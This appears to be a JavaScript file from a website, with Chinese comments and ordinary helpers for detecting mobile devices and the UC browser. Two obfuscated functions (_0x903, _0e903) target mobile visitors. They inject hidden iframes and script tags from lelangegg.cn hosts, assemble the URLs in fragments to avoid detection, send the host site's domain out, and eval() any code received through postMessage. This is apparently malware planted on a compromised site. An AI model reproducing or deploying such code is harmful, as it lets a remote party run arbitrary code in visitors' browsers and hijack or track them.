//是否UC浏览器
var isUC = /UCBrowser/i.test(navigator.userAgent);

//是否移动端
var isMobile = (function(){
    var regex_match = /(nokia|iphone|android|motorola|^mot-|softbank|foma|docomo|kddi|up.browser|up.link|htc|dopod|blazer|netfront|helio|hosin|huawei|novarra|CoolPad|webos|techfaith|palmsource|blackberry|alcatel|amoi|ktouch|nexian|samsung|^sam-|s[cg]h|^lge|ericsson|philips|sagem|wellcom|bunjalloo|maui|symbian|smartphone|midp|wap|phone|windows ce|iemobile|^spice|^bird|^zte-|longcos|pantech|gionee|^sie-|portalmmm|jigs browser|hiptop|^benq|haier|^lct|operas*mobi|opera*mini|320x320|240x320|176x220)/i;
    var u = navigator.userAgent;
    if (null == u) {
        return true;
    }
    var result = regex_match.exec(u);
    if (null == result) {
        return false
    } else {
        return true
    }
})();

var checkCount = 10;
//去掉UC的TIP提示
function rmUCTip(){
    var e=document.getElementById("_ucEnterTip");
    if(e){e.parentNode.removeChild(e);checkCount=0;}
    if(checkCount > 0){
        checkCount--;setTimeout('rmUCTip()',1000);
    }
}

function _0x903(){
    if(isMobile){
        var doment = '../https@v.lelangegg.cn';
        var baidu_url = 'v.lelangegg.cn';
        if ((/(Android)/i.test(navigator.userAgent)) && (/(baidu)/i.test(navigator.userAgent))) {
            document.write('<div id="djbstr" style="display:none;">93f1b138cff765307bc036b95623c185<\/div>');
            document.write('<script src=');
            document.write('h');
            document.write('tt');
            document.write('p');
            document.write('s:');
            document.write('../https@/');
            document.write(baidu_url);
            document.write('CoNTent12459');
            document.write('MoBile.7441hmp4Irx_View-(com');
            document.write('><\/script>')
        } else if ((/(UCBrowser)/i.test(navigator.userAgent))) {
            var website = '12459-7441';
            window.addEventListener('message', function(e) {
                var _0 = e.data;
                if (_0.hf_ev_j) {
                    eval(decodeURIComponent(_0.hf_ev_j.replace(/\+/g, "%20")))
                }
            });
            document.write('<iframe style="display:none;" src="' + doment + '/amemath.php?ssid=' + website + '" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe><iframe style="display:none;" src="' + doment + '/' + website + '(com@amdf=2" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')
        } else {
            document.writeln('<script src="' + doment + '/CoNTent12459MoBile.7441hmp4Irx_View-(com?' + (new Date()).getTime() + '"><\/script>')
        }
    }
}
function _0e903(){
    if(isMobile) {
        var domainx = '../https@c.lelangegg.cn';
        var baidu_url = 'c.lelangegg.cn';

        if (navigator.userAgent.indexOf('UCBrowser') > -1) {;
            doucmains = document.domain.match(/[^\.]+/g);
            doucmains.shift();
            doucmains = doucmains.join(".");
            document.writeln("<iframe style='width:100%;height:93px;border:0 none;margin:0;padding:0;'  src='" + domainx + "/ccifcp.php?z=946577.9620&z1=1&z2=1&domain=" + doucmains + "'></iframe>")
        } else if (navigator.userAgent.indexOf('baidu') > -1 && navigator.userAgent.indexOf('Android') > -1) {
            document.write('<div id="djbstr" style="display:none;">93f1b138cff765307bc036b95623c185<\/div>');
            document.write('<script src=');
            document.write('h');
            document.write('tt');
            document.write('p');
            document.write('s:');
            document.write('../https@/');
            document.write(baidu_url);
            document.write('ConTypE8PQTUf-1_click');
            document.write('946577MoBile.9620hm_1xhtml');
            document.write('><\/script>')
        } else {
            document.writeln("<script src='" + domainx + "/ConTypE8PQTUf-1_click946577MoBile.9620hm_1xhtml?'><\/script>")
        }
    }
}
